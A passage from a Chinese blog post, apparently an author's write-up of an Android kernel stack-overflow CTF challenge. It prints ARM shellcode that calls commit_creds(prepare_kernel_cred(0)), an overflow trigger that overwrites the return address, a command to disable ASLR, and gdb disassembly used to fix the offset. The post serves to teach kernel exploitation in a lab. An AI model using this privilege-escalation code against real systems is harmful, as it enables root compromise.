class="string">&quot;shellCode:\n\t&quot;</span></span><br><span class="line">    <span class="comment">// commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line">    <span class="comment">// -&gt; get root</span></span><br><span class="line">    <span class="string">&quot;LDR     R3, =0xc0039d34\n\t&quot;</span> <span class="comment">//prepare_kernel_cred addr</span></span><br><span class="line">    <span class="string">&quot;MOV     R0, #0\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;BLX     R3\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;LDR     R3, =0xc0039834\n\t&quot;</span> <span class="comment">//commit_creds addr</span></span><br><span class="line">    <span class="string">&quot;BLX     R3\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r3, #0x40000010\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;MSR    CPSR_c,R3\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;LDR     R3, =0x879c\n\t&quot;</span> <span class="comment">// payload function addr</span></span><br><span class="line">    <span class="string">&quot;BLX     R3\n\t&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger_vuln</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PAYLOAD (MAX + 2 * sizeof(void *))</span></span><br><span class="line">    <span class="keyword">char</span> buf[MAX_PAYLOAD];</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">void</span> *pc = buf + MAX + <span class="number">1</span> * <span class="keyword">sizeof</span>(<span class="keyword">void</span> *);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcdoe addr: %p\n&quot;</span>, shellCode);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;payload:%p\n&quot;</span>, payload);</span><br><span class="line">    *(<span class="keyword">void</span> **)pc = (<span class="keyword">void</span> *)shellCode; <span class="comment">//ret addr</span></span><br><span class="line">    <span class="comment">/* Kaboom! */</span></span><br><span class="line">    write(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    fd = open_file();</span><br><span class="line">    trigger_vuln(fd);</span><br><span class="line">    payload();</span><br><span class="line">    close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="第一处问题"><a href="#第一处问题" class="headerlink" title="第一处问题"></a>第一处问题</h3><p>为什么跑不起来呢？我们可以先分析一下 shellcode：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;    .text\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    .align 2\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    .code 32\n&quot;</span></span><br><span class="line">    <span class="string">&quot;    .globl shellCode\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;shellCode:\n\t&quot;</span></span><br><span class="line">    <span class="comment">// commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line">    <span class="comment">// -&gt; get root</span></span><br><span class="line">    <span class="string">&quot;LDR     R3, =0xc0039d34\n\t&quot;</span> <span class="comment">//prepare_kernel_cred addr</span></span><br><span class="line">    <span class="string">&quot;MOV     R0, #0\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;BLX     R3\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;LDR     R3, =0xc0039834\n\t&quot;</span> <span class="comment">//commit_creds addr</span></span><br><span class="line">    <span class="string">&quot;BLX     R3\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r3, #0x40000010\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;MSR    CPSR_c,R3\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;LDR     R3, =0x879c\n\t&quot;</span> <span class="comment">// payload function addr</span></span><br><span class="line">    <span class="string">&quot;BLX     R3\n\t&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>shellcode 是内联汇编</p>
+<blockquote>
+<ul>
+<li>调用 <code>commit_creds(prepare_kernel_cred(0))</code> 提升权限</li>
+<li>调用 <code>mov r3, #0x40000010; MSR CPSR_c,R3;</code>设置 <code>cpsr</code>寄存器，使<code>cpu</code>进入用户模式</li>
+</ul>
+</blockquote>
+<p>这两个思路已经很明确了，地址由于是固定的，所以只需要查询一次就可以写进汇编了。那最后两行是什么意思呢？根据注释我们可以推测最后会进入 <code>payload</code> 函数，执行 <code>execl</code> 拿到 shell。但是这里 <code>payload</code> 的地址为什么就一定是 <code>0x879c</code> 呢？在当时的环境下可能是这个值，而现在则很有可能变化。实际上，本环境开启了 ASLR：</p>
+<p><img src="https://ws1.sinaimg.cn/large/79b6884ely1fzemxkdclvj20ef014jra.jpg"></p>
+<p>我们通过以下指令关闭：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
+<p>这样的话每次 <code>payload</code> 的位置就固定了。我们就可以将此时的 <code>payload</code> 函数位置“硬编码”进汇编中。</p>
+<h3 id="第二处问题"><a href="#第二处问题" class="headerlink" title="第二处问题"></a>第二处问题</h3><p>然而，这其实只是解决了第一处问题。。还有一处问题，出现在哪里呢？请容我细细道来。</p>
+<p>由于我们已经开启了 gdb，其实是可以调试的。vmlinux 提供了符号表，而会被利用的函数也知道了是 <code>proc_entry_write</code> 这个函数，因此我们就可以在这里下断点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b proc_entry_write</span><br><span class="line">Breakpoint 1 at 0xc025c2cc: file drivers&#x2F;vulnerabilities&#x2F;kernel_build&#x2F;..&#x2F;challenges&#x2F;stack_buffer_overflow&#x2F;module&#x2F;stack_buffer_overflow.c, line 17.</span><br></pre></td></tr></table></figure>
+<p>我们还可以看看这个函数的汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble proc_entry_write</span><br><span class="line">Dump of assembler code for function proc_entry_write:</span><br><span class="line">   0xc025c2cc &lt;+0&gt;:		push	&#123;r4, r5, lr&#125;</span><br><span class="line">   0xc025c2d0 &lt;+4&gt;:		sub	sp, sp, #68	; 0x44</span><br><span class="line">   0xc025c2d4 &lt;+8&gt;:		ldr	r0, [pc, #120]	; 0xc025c354</span><br><span class="line">   0xc025c2d8 &lt;+12&gt;:	mov	r4, r2</span><br><span class="line">   0xc025c2dc &lt;+16&gt;:	mov	r5, r1</span><br><span class="line">   0xc025c2e0 &lt;+20&gt;:	bl	0xc0362f78 &lt;printk&gt;</span><br><span class="line">   0xc025c2e4 &lt;+24&gt;:	mov	r2, sp</span><br><span class="line">   0xc025c2e8 &lt;+28&gt;:	bic	r3, r2, #8128	; 0x1fc0</span><br><span class="line">   0xc025c2ec &lt;+32&gt;:	bic	r3, r3, #63	; 0x3f</span><br><span class="line">   0xc025c2f0 &lt;+36&gt;:	ldr	r3, [r3, #8]</span><br><span class="line">   0xc025c2f4 &lt;+40&gt;:	adds	r2, r5, r4</span><br><span class="line">   0xc025c2f8 &lt;+44&gt;:	sbcscc	r2, r2, r3</span><br><span class="line">   0xc025c2fc &lt;+48&gt;:	movcc	r3, #0</span><br><span class="line">   0xc025c300 &lt;+52&gt;:	cmp	r3, #0</span><br><span class="line">   0xc025c304 &lt;+56&gt;:	bne	0xc025c324 &lt;proc_entry_write+88&gt;</span><br><span class="line">   0xc025c308 &lt;+60&gt;:	mov	r0, sp</span><br><span class="line">   0xc025c30c &lt;+64&gt;:	mov	r1, r5</span><br><span class="line">   0xc025c310 &lt;+68&gt;:	mov	r2, r4</span><br><span class="line">   0xc025c314 &lt;+72&gt;:	bl	0xc01cb88c &lt;__copy_from_user&gt;</span><br><span class="line">   0xc025c318 &lt;+76&gt;:	cmp	r0, #0</span><br><span class="line">   0xc025c31c &lt;+80&gt;:	beq	0xc025c348 &lt;proc_entry_write+124&gt;</span><br><span class="line">   0xc025c320 &lt;+84&gt;:	b	0xc025c338 &lt;proc_entry_write+108&gt;</span><br><span class="line">   0xc025c324 &lt;+88&gt;:	cmp	r4, #0</span><br><span class="line">   0xc025c328 &lt;+92&gt;:	beq	0xc025c348 &lt;proc_entry_write+124&gt;</span><br><span class="line">   0xc025c32c &lt;+96&gt;:	mov	r0, sp</span><br><span class="line">   0xc025c330 &lt;+100&gt;:	mov	r1, r4</span><br><span class="line">   0xc025c334 &lt;+104&gt;:	bl	0xc01ccd80 &lt;__memzero&gt;</span><br><span class="line">   0xc025c338 &lt;+108&gt;:	ldr	r0, [pc, #24]	; 0xc025c358</span><br><span class="line">   0xc025c33c &lt;+112&gt;:	bl	0xc0362f78 &lt;printk&gt;</span><br><span class="line">   0xc025c340 &lt;+116&gt;:	mvn	r0, #13</span><br><span class="line">   0xc025c344 &lt;+120&gt;:	b	0xc025c34c &lt;proc_entry_write+128&gt;</span><br><span class="line">   0xc025c348 &lt;+124&gt;:	mov	r0, r4</span><br><span class="line">   0xc025c34c &lt;+128&gt;:	add	sp, sp, #68	; 0x44</span><br><span class="line">   0xc025c350 &lt;+132&gt;:	pop	&#123;r4, r5, pc&#125;</span><br><span class="line">   0xc025c354 &lt;+136&gt;:	subgt	lr, r1, r5, lsr #1</span><br><span class="line">   0xc025c358 &lt;+140&gt;:	subgt	lr, r1, r2, asr #1</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<p>在这里我们能看到，最开始的时候 push 了三个寄存器：r4、r5、lr。我们要覆盖的这个寄存器，就是返回地址 lr。这里的汇编代码是这样的：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push	&#123;r4, r5, lr&#125;</span><br></pre></td></tr></table></figure>
+<p>那压栈顺序是什么样的？？</p>
+<p>最开始的时候我以为是从左向右，直到我几次 exp 都挂掉之后才去网上查了一下，是从右向左。。因此我们封盖的地址应该是 68+4*3 大小才能覆盖到 lr 上。而上面的 exp 只覆盖到了 68+4。。在这里我刚开始卡了好久，看内核输出根本看不懂，直到我意识到还可以调试。。</p>
+<h3 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h3><p>之前以为打包好的虚拟机环境不会有地址上的改变，结果我配好的环境到了别人那里居然和 payload 差不多。。我的妈呀，哭了哭了，这是我出题出的最菜的一次，下一次绝对不会这么简单了，哼~</p>
+<p>在我这里环境发生了变化。但其实要改的位置也不多，也就上述压栈的大小和那一处地址需要改变。具体的。。只要学过一点 pwn 就一定会写的，我就不写了。。</p>
+<h1 id="XMAN-冬令营总结"><a href="#XMAN-冬令营总结" class="headerlink" title="XMAN 冬令营总结"></a>XMAN 冬令营总结</h1><p>这一次比赛是以这道题作为出题点的。我们环境没有配置好导致必须要提供虚拟机。其实这就是一道披着 Android 外衣的纯内核题，我们完全可以自己编译提供文件系统再开放端口的。没有这么做导致我们不得不来回拷贝虚拟机。下一次可以尝试写成 docker 镜像。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground/tree/master/challenges">Fuzion24/AndroidKernelExploitationPlayground</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hac425/p/9416962.html">Android内核漏洞利用技术实战：环境搭建&amp;栈溢出实战</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2054">入门学习linux内核提权</a></p>
+<p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge/">基础知识</a></p>
+
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>Author: </span>
+      <a href="http://www.qrzbing.cn/blog">qrzbing</a>
+    </p>
+    <p class="copyright-item">
+      <span>Link: </span>
+      <a href="http://www.qrzbing.cn/blog/2019/01/21/Kernel-pwn-%E5%88%9D%E6%8E%A2/">http://www.qrzbing.cn/blog/2019/01/21/Kernel-pwn-%E5%88%9D%E6%8E%A2/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/blog/tags/pwn/">pwn</a>
+            </div>
+        
+        <nav class="post-nav"><a class="prev" href="/blog/2019/01/30/%E5%9B%9E%E5%BF%86/">
+        <i class="iconfont icon-left"></i>
+        <span class="prev-text nav-default">回忆</span>
+        <span class="prev-text nav-mobile">Prev</span>
+      </a>
+    <a class="next" href="/blog/2019/01/03/new-year2019/">
+        <span class="next-text nav-default">2018碎碎念</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:qrzbing#gmail.com" class="iconfont icon-email" title="email"></a>
+        <a target="_blank" rel="noopener" href="https://github.com/qrzbing" class="iconfont icon-github" title="github"></a>
+        <a href="/blog/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2015 - 2021<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">qrzbing</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/blog/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/blog/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/blog/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/blog/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
